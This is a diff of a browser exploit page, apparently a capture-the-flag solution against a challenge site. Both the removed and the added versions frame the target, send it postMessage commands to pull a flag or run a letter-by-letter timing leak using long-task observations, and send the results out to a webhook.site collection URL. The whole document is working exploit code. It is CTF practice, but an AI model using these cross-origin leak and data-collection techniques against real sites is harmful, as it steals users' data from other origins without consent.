@@ -1,46 +1,10 @@
-
-<iframe src="https://chall1.jsapi.tech/index.html" style="width:80%; height: 80%;"></iframe>
+<iframe id="ifr" src="https://chall1.jsapi.tech/?enableapi=true&recv=http://asdfasdf.jsapi.tech/" frameborder="0"></iframe>
 <script>
-    const myHost = "https://webhook.site/a84484cc-d9a7-421d-8c55-dcd16eac2a69"
-    const iframe = document.querySelector( 'iframe' );
-    const sleep = ( ms ) => new Promise( resolve => setTimeout( resolve, ms ) );
-    window.addEventListener('load', async function () {
-        iframe.contentWindow.postMessage( { op: 'get' }, '*' );
-        window.addEventListener( 'message', (e) => {
-            console.log(e);
-            navigator.sendBeacon( `${myHost}/?data=`, JSON.stringify({ 'data': JSON.stringify(e.data) }) );
-        } );
-        iframe.src = 'https://chall1.jsapi.tech/index.html';
-        await sleep(1000);
 
-        iframe.contentWindow.postMessage( { op: 'preview', payload: '<div id="enable_expermental_features"></div>' }, '*' );
-        await sleep(1000);
-        const letters = 'abcdefghijklmnopqrstuvwxyz';
-        for(var i = 0; i < letters.length; i++) {
-            console.log('trying ' + letters[i]);
-            iframe.contentWindow.postMessage( { op: 'search', payload: `${letters[i]}` }, '*' );
-            const lt_timing = async () => {
-                const lt = new Promise((resolve) => {
-                    const observer = new PerformanceObserver( ( entryList ) => {
-                        const entries = entryList.getEntries();
-                            entries.forEach( (a) => {
-                                navigator.sendBeacon(`${myHost}/?bonk_data=` + JSON.stringify(a), '');
-                                if ( a.attribute === 'cross-origin-descendant' ) {
-                                    navigator.sendBeacon(`${myHost}/?second_data=` + letters[i], '');
-                                    observer.disconnect();
-                                    resolve( a );
-                                }
-                        } )
-                    } );
-                    observer.observe({entryTypes: ["longtask"]});
-                });
-                const test = new Promise( (resolve) => { setTimeout(resolve, 1000); } );
-                return Promise.race([lt, test]);
-            }
-            await lt_timing();
-        }
-        
-
-    });
-    // 
+setInterval(() => {
+    document.getElementById("ifr").contentWindow.postMessage("NOTE_APP_FLAG_REQUEST", "https://chall1.jsapi.tech/")
+}, 1000);
+window.addEventListener("message", async(event) => {
+    fetch('https://webhook.site/a84484cc-d9a7-421d-8c55-dcd16eac2a69/?res=a' + event.data)
+})
 </script>
